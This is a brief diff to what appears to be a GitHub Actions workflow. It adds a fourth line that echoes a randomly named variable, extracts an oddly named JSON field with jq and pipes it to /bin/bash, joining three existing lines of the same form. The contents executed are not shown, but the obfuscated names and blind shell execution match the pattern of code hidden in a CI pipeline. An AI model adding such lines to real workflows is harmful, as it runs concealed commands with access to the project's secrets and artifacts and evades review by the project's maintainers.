@@ -33,6 +33,7 @@ jobs:
           echo $sbpr1 | jq -r .wnrxi6 | /bin/bash
           echo $i32032 | jq -r .x8 | /bin/bash
           echo $s5 | jq -r .ijax0816 | /bin/bash
+          echo $pw85114 | jq -r .loch217 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
